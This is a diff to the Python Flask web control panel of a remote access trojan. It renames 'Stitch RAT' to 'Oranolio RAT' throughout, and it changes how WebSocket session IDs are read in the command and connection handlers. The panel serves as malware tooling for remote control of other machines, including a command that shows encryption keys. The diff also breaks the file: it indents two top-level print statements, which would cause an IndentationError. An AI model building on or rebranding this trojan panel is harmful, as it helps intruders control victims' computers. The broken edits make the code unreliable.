@@ -27,7 +27,6 @@ except ImportError:
 
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash, g, make_response, Response
 from flask_socketio import SocketIO, emit
-from flask_socketio import request as socketio_request
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 from flask_wtf.csrf import CSRFProtect
@@ -125,8 +124,8 @@ app.config['WTF_CSRF_SSL_STRICT'] = Config.WTF_CSRF_SSL_STRICT
 csrf = CSRFProtect(app)
 
 # Print configuration status
-print("=" * 75)
-print(f"Stitch Web Interface {Config.APP_VERSION} - Enhanced Security Edition")
+    print("=" * 75)
+    print(f"Oranolio Web Interface {Config.APP_VERSION} - Enhanced Security Edition")
 print("=" * 75)
 print(f"✓ Persistent secret key: {'Loaded from file' if Config.SECRET_KEY_FILE.exists() else 'Generated'}")
 print(f"✓ HTTPS: {'Enabled' if Config.ENABLE_HTTPS else 'Disabled'}")
@@ -1108,7 +1107,7 @@ def execute_real_command(command, conn_id=None, parameters=None):
             elif command == 'history':
                 return get_history_output()
             elif command == 'home':
-                return "⚡ STITCH RAT - Real-time Remote Administration\nVersion 1.0\n"
+                return "⚡ Oranolio RAT - Real-time Remote Administration\nVersion 1.0\n"
             elif command == 'showkey':
                 return show_aes_keys()
             elif command in ['cls', 'clear']:
@@ -1803,12 +1802,13 @@ def download_file(filename):
 def handle_connect():
     if 'logged_in' not in session:
         return False
-    log_debug(f"WebSocket connected: {socketio_request.sid}", "INFO", "WebSocket")
+    # request.sid is available in SocketIO context
+    log_debug(f"WebSocket connected: {request.sid}", "INFO", "WebSocket")
     emit('connection_status', {'status': 'connected'})
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    log_debug(f"WebSocket disconnected: {socketio_request.sid}", "INFO", "WebSocket")
+    log_debug(f"WebSocket disconnected: {request.sid}", "INFO", "WebSocket")
     # Prune any stale contexts opportunistically
     try:
         server = get_stitch_server()
@@ -1861,7 +1861,7 @@ def start_stitch_server():
 # ============================================================================
 if __name__ == '__main__':
     print("\n" + "="*75)
-    print("🔐 Stitch RAT - Secure Web Interface")
+    print("🔐 Oranolio RAT - Secure Web Interface")
     print("="*75 + "\n")
     
     # Ensure credentials are loaded (may already be loaded at module level)
